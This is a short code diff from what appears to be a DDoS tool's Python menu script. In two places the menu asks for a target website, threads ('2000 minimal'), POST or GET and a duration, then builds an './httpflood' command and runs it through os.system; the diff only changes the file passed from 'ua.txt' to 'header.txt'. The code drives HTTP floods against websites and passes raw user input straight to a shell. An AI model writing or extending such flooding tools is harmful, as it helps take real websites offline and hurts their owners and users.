@@ -748,7 +748,7 @@ def menu():
                     httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
                     httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
                     httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
-                    mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} ua.txt')
+                    mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} header.txt')
                     tip()
                 
                     os.system(mhgetsend)
@@ -990,7 +990,7 @@ def menu():
                 httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
                 httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
                 httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
-                mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} ua.txt')
+                mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} header.txt')
                 tip()
                 
                 os.system(mhgetsend)
